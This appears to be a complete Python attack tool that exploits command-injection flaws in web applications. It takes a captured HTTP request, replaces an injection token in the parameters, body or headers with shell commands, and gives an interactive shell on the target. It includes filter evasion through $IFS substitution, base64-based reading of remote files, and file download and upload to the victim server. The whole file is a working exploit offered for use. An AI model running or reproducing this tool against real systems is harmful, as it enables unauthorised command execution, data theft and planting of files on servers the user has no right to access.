#!/usr/bin/env python3

import binascii
import readline

from argparse import ArgumentParser
from base64 import b64encode,b64decode
from os import system
from requests import request as rrequest
from urllib.parse import quote_plus

def debug(string, msg='Debug'):
    print("[~] " + msg + ": ", end='')
    print(string)

def command_cat(command='', encoding='utf-8'):
    filename = command.split()[1]

    filecontent = execute_command(request, 'base64 ' + filename)

    if args.debug:
        debug(filecontent, 'file content')

    try:
        print(b64decode(filecontent).decode(encoding))
    except UnicodeDecodeError:
        print("File " + filename + "seems to be a binary file, try 'catb' special command to force print it (or better yet: xxd)")
    except binascii.Error:
        print("File " + filename + "b64 encoded contains start/end tokens, use something like xxd")

def command_catb(command=''):
    command_cat(command, encoding='latin-1')

def command_cd(command=''):
    global cur_dir

    new_dir = command.split()[1]

    if args.debug:
        debug(cur_dir, msg='Current dir')

    cur_dir = execute_command(request, 'pwd').strip()

    if new_dir.startswith('/'):
        cur_dir = new_dir
    else:
        cur_dir += '/' + new_dir

    if args.debug:
        debug(cur_dir, msg='New current dir')

def command_clear(null=''):
    system("clear")

def command_download(command=''):
    filename = command.split()[1]

    filecontent = execute_command(request, 'base64 ' + filename)
    filecontent = b64decode(filecontent).strip()

    with open(filename, 'wb') as f:
        f.write(filecontent)

    print('File ' + filename + ' downloaded')

def command_exit(null=''):
    print("\nExiting...")
    exit()

def command_upload(command=''):
    filename = command.split()[1]

    with open(filename, 'rb') as f:
        filecontent = f.read()

    filecontent = b64encode(filecontent).decode()

    execute_command(request, 'echo -n "' + filecontent + '" | base64 -d > ' +
                    filename)

    print('File ' + filename + ' uploaded')

COMMANDS = {
    'cat': command_cat,
    'catb': command_catb,
    'cd': command_cd,
    'clear': command_clear,
    'download': command_download,
    'exit': command_exit,
    'upload': command_upload
}

def special_commands(command):
    COMMANDS[command.split()[0]](command)

def request_parser(fd):
    method, path, version = fd.readline().split()
    headers = {}
    request = {}

    lines = fd.readlines()
    for line in lines:
        if line in (b'\n', b'\r\n'):
            break

        headers[line.split(b': ')[0]] = line.split(b': ')[1].strip()

    request['path'] = path
    request['method'] = method
    request['version'] = version
    request['headers'] = headers

    if b'?' in request['path']:
        request['path'], request['params'] = request['path'].split(b'?')
    else:
        request['params'] = b''

    request['body'] = b''
    if method == b'POST':
        request['body'] = lines[-1]

    if request['path'].startswith(b'http'):
        request['url'] = request['path']
    else:
        request['url'] = b'http://' + request['headers'][b'host'] + request['path']

    if args.injection_token.encode() in request['params']:
        request['inject'] = 'params'
    elif args.injection_token.encode() in request['body']:
        request['inject'] = 'body'
    else:
        for k,v in request['headers'].items():
            if args.injection_token.encode() in v:
                request['inject'] = 'headers'
                request['inject_header'] = k

    return request

def execute_command(request, command):
    if cur_dir:
        command = 'cd ' + cur_dir + ';' + command

    if args.ifs:
        command = command.replace(' ', '$IFS')

    if not args.no_url_encode:
        command = quote_plus(command)

    req = request.copy()
    if req['inject'] == 'headers':
        req['headers'] = request['headers'].copy()
        req[req['inject']][req['inject_header']] = \
            req[req['inject']][req['inject_header']].replace(args.injection_token.encode(),
                                                             command.encode())
    else:
        req[req['inject']] = \
            req[req['inject']].replace(args.injection_token.encode(),
                                       command.encode())

    if args.debug:
        debug(req, msg='Request')

    r = rrequest(req['method'],
                req['url'],
                headers=req['headers'],
                data=req['body'],
                params=req['params'])

    output = r.text
    if args.start_token:
        output = output[output.find(args.start_token)+len(args.start_token):]
    if args.end_token:
        output = output[:output.find(args.end_token)]

    return output

def parse_command(request, command):
    if command == '':
        pass
    elif command.split()[0] in COMMANDS:
        special_commands(command)
    else:
        print(execute_command(request, command), end='')

if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("req", help="File containing raw http request", type=str)

    parser.add_argument("-d", "--debug", action="store_true",
                        help="Enable debug output",
                        default=False)
    parser.add_argument("-i", "--ifs", action="store_true",
                        help="Replaces whitespaces with $IFS",
                        default=False)
    parser.add_argument("-ne", "--no-url-encode", action="store_true",
                        help="Disable command URL encode",
                        default=False)

    parser.add_argument("-it", "--injection-token", type=str,
                        help="Token to be replaced by commands (default: INJECT)",
                        default='INJECT')
    parser.add_argument("-st", "--start-token", type=str,
                        help="Token that marks the output beginning",
                        default=False)
    parser.add_argument("-et", "--end-token", type=str,
                        help="Token that marks the output ending",
                        default=False)

    args = parser.parse_args()

    with open(args.req, 'rb') as fd:
        request = request_parser(fd)

    cur_dir = ''

    while True:
        try:
            PS1 = '$ '
            command = input(PS1)
            parse_command(request, command)
        except (KeyboardInterrupt, EOFError) as e:
            command_exit()

